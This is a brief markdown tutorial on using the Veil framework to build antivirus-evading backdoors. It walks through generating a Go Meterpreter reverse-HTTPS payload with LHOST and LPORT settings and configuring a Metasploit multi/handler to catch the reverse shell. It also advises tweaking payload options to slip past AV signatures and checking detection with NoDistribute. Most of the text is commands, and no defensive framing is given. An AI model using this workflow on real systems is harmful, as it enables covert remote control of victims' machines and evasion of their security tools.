# VEIL

Veil is a framework for generating __undetectable__ backdoors.

```
apt-get install veil
```

## Creating demo payload

```
veil
> list > Evasion
# VEIL-EVASION
list (see payloads)
> go/meterpreter/rev_https.py (example)
```

You can validate payload detection through _NoDistribute_ utility.

### Reverse connection example

```
# VEIL-EVASION
> list > go/meterpreter/rev_https.py
set LHOST <Metasploit handler>
set LPORT <Metasploit port>
generate
```

It is a good idea to set up different payload options to make it look a little bit different to common AV's signatures.

After generating the file, we need to set our _Metasploit handler_.

```
msfconsole
use exploit/multi/handler
# configuration should correspond to the payload used in the backdoor
set PAYLOAD windows/meterpreter/reverse_https
set LHOST <host ip>
set LPORT <desired port>
```

## Listening for connections with Metasploit

```
msfconsole
use exploit/multi/handler
show options
set PAYLOAD windows/meterpreter/reverse_https
```